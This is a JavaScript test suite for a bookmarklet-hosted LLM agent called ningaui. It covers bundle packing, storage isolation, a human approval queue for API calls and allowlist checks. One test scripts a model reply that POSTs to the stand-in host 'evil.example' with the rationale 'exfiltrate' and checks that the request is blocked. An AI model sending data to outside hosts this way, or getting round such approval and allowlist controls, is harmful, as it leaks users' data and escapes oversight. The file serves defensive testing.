// Bookmarklet checks.
//
// The bundle is a classic script, so it is driven the way a page executes it: raw source
// into a vm context with the browser globals it expects stubbed. Everything runs through
// the real in-page bus, the real bg.js and the real core — the same path a click uses.

import assert from "node:assert/strict";
import { existsSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import vm from "node:vm";
import { gunzipSync } from "node:zlib";

let passed = 0, failed = 0;
const test = async (name, fn) => {
  try { await fn(); console.log(`ok    ${name}`); passed++; }
  catch (err) { console.log(`FAIL  ${name}: ${err.message}`); failed++; }
};

const BUNDLE_PATH = fileURLToPath(new URL("../dist/bookmarklet/ningaui-bookmarklet.js", import.meta.url));
if (!existsSync(BUNDLE_PATH)) {
  console.log("FAIL  the bookmarklet bundle is missing — run: python3 build.py");
  process.exit(1);
}
const BUNDLE = readFileSync(BUNDLE_PATH, "utf8");

const plain = (x) => JSON.parse(JSON.stringify(x));

function memoryLocalStorage() {
  const mem = new Map();
  return {
    get length() { return mem.size; },
    key: (i) => [...mem.keys()][i] ?? null,
    getItem: (k) => (mem.has(k) ? mem.get(k) : null),
    setItem: (k, v) => { mem.set(k, String(v)); },
    removeItem: (k) => { mem.delete(k); },
  };
}

function makeSandbox({ fetchImpl } = {}) {
  const sandbox = {
    console, URL, setTimeout, clearTimeout, queueMicrotask,
    localStorage: memoryLocalStorage(),
    fetch: fetchImpl || (async () => { throw new Error("fetch not stubbed"); }),
  };
  sandbox.globalThis = sandbox;
  vm.createContext(sandbox);
  return sandbox;
}

const boot = (sandbox) => {
  vm.runInContext(BUNDLE, sandbox, { filename: "ningaui-bookmarklet.js" });
  return sandbox.__NINGAUI__;
};
const call = (app, msg) => new Promise((res) => app.send(msg, res));

function seedConfig(sandbox, patch = {}) {
  sandbox.localStorage.setItem("ningaui:config", JSON.stringify({
    backend: "openai",
    baseUrl: "http://localhost:11434/v1",
    model: "scripted",
    allowlist: ["http://localhost:11434/v1/state"],
    ...patch,
  }));
}

function scriptedFetch({ replies, calls = [] }) {
  let i = 0;
  return async (url, init = {}) => {
    calls.push({ url, method: init.method || "GET", body: init.body ? JSON.parse(init.body) : null });
    if (/\/chat\/completions$/.test(url)) {
      const content = replies[Math.min(i++, replies.length - 1)];
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content } }] }), text: async () => content };
    }
    return { ok: true, status: 200, text: async () => JSON.stringify({ ok: true }) };
  };
}

const withEvents = (app) => {
  const events = [];
  app.host.runtime.onMessage.addListener((m) => { events.push(plain(m)); });
  return events;
};

// localStorage stores the value alone under "ningaui:status" (the {key: value} wrapper
// only exists at the chrome.storage API surface), so parse it directly.
const statusOf = (sandbox) => JSON.parse(sandbox.localStorage.getItem("ningaui:status") || "{}");

// ---- the artifact ------------------------------------------------------------
await test("the bundle is self-contained: no module syntax, no external assets", async () => {
  assert.ok(BUNDLE.length > 20_000 && BUNDLE.length < 400_000, `unexpected bundle size ${BUNDLE.length}`);
  assert.ok(!/^\s*import[\s{"']/m.test(BUNDLE), "module import left in the bundle");
  assert.ok(!/^\s*export[\s{]/m.test(BUNDLE), "module export left in the bundle");
  assert.ok(!BUNDLE.includes('src="icons/'), "asset reference left in the panel markup");
  assert.ok(BUNDLE.includes("data:image/png;base64,"), "panel icon was not inlined");
  assert.ok(BUNDLE.includes("Awaiting your decision"), "the panel markup is missing from the bundle");
});

await test("the packed install URL fits Firefox's ~64 kB bookmark limit and round-trips", async () => {
  const urlPath = fileURLToPath(new URL("../dist/bookmarklet/ningaui-bookmarklet.url.txt", import.meta.url));
  assert.ok(existsSync(urlPath), "ningaui-bookmarklet.url.txt is missing — run: python3 build.py");
  const url = readFileSync(urlPath, "utf8").trim();
  assert.ok(url.startsWith("javascript:"), "the install URL must be a javascript: URL");
  assert.ok(url.length < 63_000, `packed URL is ${url.length} bytes — Firefox truncates bookmarks around 64 kB`);

  const src = decodeURIComponent(url.slice("javascript:".length));
  assert.doesNotThrow(() => new vm.Script(src), "the loader must be valid JavaScript");
  assert.ok(src.includes("DecompressionStream"), "the loader must decompress the packed bundle");
  const b64 = src.match(/const b="([A-Za-z0-9+/=]+)"/)?.[1];
  assert.ok(b64, "packed payload not found in the loader");
  const unpacked = gunzipSync(Buffer.from(b64, "base64")).toString("utf8");
  assert.equal(unpacked, BUNDLE, "the unpacked payload must be exactly the readable bundle");
});

// ---- hosting behaviour -------------------------------------------------------
await test("it boots in a page-like context and reports itself as the bookmarklet", async () => {
  const sandbox = makeSandbox({});
  const app = boot(sandbox);
  assert.equal(app.host.__ningaui, "bookmarklet");
  assert.equal(typeof app.toggle, "function");

  const env = await call(app, { type: "env" });
  assert.equal(env.browser, "bookmarklet");
  assert.equal(env.keepalive, "runtime port");
  assert.equal(env.builtInModel, false);
});

await test("permissions are always granted in page context", async () => {
  const sandbox = makeSandbox({});
  seedConfig(sandbox);
  const app = boot(sandbox);
  const perms = await call(app, { type: "permissions" });
  assert.equal(perms.granted, true);
  assert.deepEqual(plain(perms.origins), ["http://localhost:11434/*"]);
});

await test("a full run through the bus: sandbox write, finish, journal, status", async () => {
  const sandbox = makeSandbox({ fetchImpl: scriptedFetch({
    replies: [
      '{"tool":"remember","args":{"key":"note","value":{"n":5}}}',
      '{"tool":"finish","args":{"summary":"wrote the note"}}',
    ],
  }) });
  seedConfig(sandbox);
  const app = boot(sandbox);
  const events = withEvents(app);

  const result = await call(app, { type: "run", task: "write a note" });
  assert.equal(result.status, "ok");
  assert.equal(result.result, "wrote the note");

  const kinds = events.filter((m) => m.type === "event").map((m) => m.event.type);
  for (const kind of ["start", "tool_call", "tool_result", "final"]) {
    assert.ok(kinds.includes(kind), `missing ${kind} event`);
  }
  const toolCall = events.find((m) => m.type === "event" && m.event.type === "tool_call");
  assert.equal(toolCall.event.name, "remember");

  assert.deepEqual(JSON.parse(sandbox.localStorage.getItem("ningaui:agent:note")), { n: 5 });
  assert.equal(statusOf(sandbox).state, "done");

  const journal = await call(app, { type: "journal", runId: result.runId });
  assert.ok(journal.journal.length >= 4, "journal should hold start/tool/final records");
});

await test("api_request queues for a human, then applies on approval", async () => {
  const calls = [];
  const sandbox = makeSandbox({ fetchImpl: scriptedFetch({
    calls,
    replies: [
      '{"tool":"api_request","args":{"url":"http://localhost:11434/v1/state","method":"POST","body":{"v":1},"rationale":"set v to 1"}}',
      '{"tool":"finish","args":{"summary":"queued the change"}}',
    ],
  }) });
  seedConfig(sandbox);
  const app = boot(sandbox);

  const result = await call(app, { type: "run", task: "set v" });
  assert.equal(result.status, "ok");

  const q = await call(app, { type: "actions" });
  assert.equal(q.pending.length, 1);
  const a = plain(q.pending[0]);
  assert.equal(a.mode, "confirm");
  assert.equal(a.cls, "POST localhost:11434/v1/state");
  assert.equal(statusOf(sandbox).state, "awaiting_decision");

  const d = await call(app, { type: "decide", id: a.id, decision: "approve" });
  assert.equal(d.ok, true);
  assert.equal(plain(d.action).status, "applied");
  assert.ok(calls.some((c) => c.method === "POST" && c.url === "http://localhost:11434/v1/state" && c.body?.v === 1),
    "the approved call must hit the endpoint");
  assert.equal(statusOf(sandbox).state, "idle");

  const q2 = await call(app, { type: "actions" });
  assert.equal(q2.pending.length, 0);
  assert.ok(q2.recent.some((r) => r.status === "applied" && r.by === "human"));
});

await test("declining needs a reason, and the decline lands in the ledger", async () => {
  const sandbox = makeSandbox({ fetchImpl: scriptedFetch({
    replies: [
      '{"tool":"api_request","args":{"url":"http://localhost:11434/v1/state","method":"POST","body":{"v":2},"rationale":"set v to 2"}}',
      '{"tool":"finish","args":{"summary":"queued again"}}',
    ],
  }) });
  seedConfig(sandbox);
  const app = boot(sandbox);

  await call(app, { type: "run", task: "set v again" });
  const q = await call(app, { type: "actions" });
  const a = plain(q.pending[0]);

  const noReason = await call(app, { type: "decide", id: a.id, decision: "decline" });
  assert.equal(noReason.ok, false);
  assert.match(noReason.error, /reason/);

  const declined = await call(app, { type: "decide", id: a.id, decision: "decline", reason: "not now" });
  assert.equal(declined.ok, true);
  assert.equal(plain(declined.action).status, "declined");

  const trust = plain(await call(app, { type: "trust" }));
  const rec = trust.classes.find((c) => c.cls === "POST localhost:11434/v1/state");
  assert.equal(rec.declined, 1);
});

await test("an off-allowlist target is refused before anything is sent", async () => {
  const calls = [];
  const sandbox = makeSandbox({ fetchImpl: scriptedFetch({
    calls,
    replies: [
      '{"tool":"api_request","args":{"url":"http://evil.example/x","method":"POST","body":{},"rationale":"exfiltrate"}}',
      '{"tool":"finish","args":{"summary":"tried"}}',
    ],
  }) });
  seedConfig(sandbox);
  const app = boot(sandbox);
  const events = withEvents(app);

  const result = await call(app, { type: "run", task: "do something off-list" });
  assert.equal(result.status, "ok");
  const refusal = events.find((m) => m.type === "event" && m.event.type === "tool_result" && m.event.name === "api_request");
  assert.match(JSON.stringify(refusal.event.result), /not on the allowlist/);
  assert.ok(!calls.some((c) => c.url.includes("evil.example")), "nothing may reach an off-list host, not even a preview read");
});

await test("storage is namespaced under ningaui: and never touches the page's own keys", async () => {
  const sandbox = makeSandbox({ fetchImpl: scriptedFetch({
    replies: ['{"tool":"remember","args":{"key":"k","value":1}}', '{"tool":"finish","args":{"summary":"x"}}'],
  }) });
  sandbox.localStorage.setItem("user:pref", "keep");
  seedConfig(sandbox);
  const app = boot(sandbox);
  await call(app, { type: "run", task: "write" });

  const keys = [];
  for (let i = 0; i < sandbox.localStorage.length; i++) keys.push(sandbox.localStorage.key(i));
  assert.ok(keys.includes("user:pref"), "the page's own key must survive");
  assert.ok(keys.every((k) => k === "user:pref" || k.startsWith("ningaui:")), `unexpected key: ${keys.join(", ")}`);

  const all = plain(await app.host.storage.local.get(null));
  assert.ok(!("user:pref" in all), "the agent must not see the page's keys");
  assert.ok("agent:k" in all);
});

await test("running the bookmarklet again toggles instead of booting a second agent", async () => {
  const sandbox = makeSandbox({});
  const app = boot(sandbox);
  assert.equal(app.host.__debug.messageListeners(), 1);

  vm.runInContext(BUNDLE, sandbox, { filename: "ningaui-bookmarklet.js" });
  assert.equal(app.host.__debug.messageListeners(), 1, "a second execution must not register a second host");

  const env = await call(app, { type: "env" });
  assert.equal(env.browser, "bookmarklet");
});

await test("a failing model endpoint becomes a clean status, not a crash", async () => {
  const sandbox = makeSandbox({ fetchImpl: async (url) => {
    if (/\/chat\/completions$/.test(url)) return { ok: false, status: 500, text: async () => "boom" };
    return { ok: true, status: 200, text: async () => "{}" };
  } });
  seedConfig(sandbox);
  const app = boot(sandbox);

  const result = await call(app, { type: "run", task: "anything" });
  assert.equal(result.status, "model_error");
  assert.equal(statusOf(sandbox).state, "model_error");
});

console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
